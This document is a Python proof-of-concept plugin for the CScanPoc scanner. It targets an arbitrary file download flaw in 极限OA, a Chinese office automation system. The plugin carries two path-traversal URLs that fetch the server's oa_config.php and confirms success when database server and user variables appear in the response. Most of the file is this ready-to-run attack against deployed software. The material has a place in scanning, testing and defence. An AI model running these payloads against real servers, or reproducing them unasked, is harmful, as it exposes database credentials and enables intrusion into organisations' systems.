# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'SohuuOA_0001'  # 平台漏洞编号，留空
    name = '极限OA 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-07-16'  # 漏洞公布时间
    desc = '''
        极限OA网络智能办公系统是一款办公软件，运行环境支持Win9x/Me/NT/2000/XP/2003。
        极限OA 任意文件下载。
        /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
        /module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0126661'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '极限OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09bd251d-f6c8-4d79-940e-a6be0075693a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://wooyun.org/bugs/wooyun-2010-0126661
            hh = hackhttp.hackhttp()
            payload1 = '/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
            payload2 = '/module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php'

            url1 = self.target + payload1
            code1, head, body1, errcode, _url = hh.http(url1)
            if code1 == 200 and '$MYSQL_SERVER' in body1 and '$MYSQL_USER' in body1 and '$MYSQL_DB' in body1:
                #security_hole(url1 + 'Arbitrary File Download')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            url2 = self.target + payload2
            code2, head, body2, errcode, _url = hh.http(url2)
            if code2 == 200 and '$MYOA_SESS_SAVE_HANDLER' in body2:
                #security_hole(url1 + '\nArbitrary File read')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
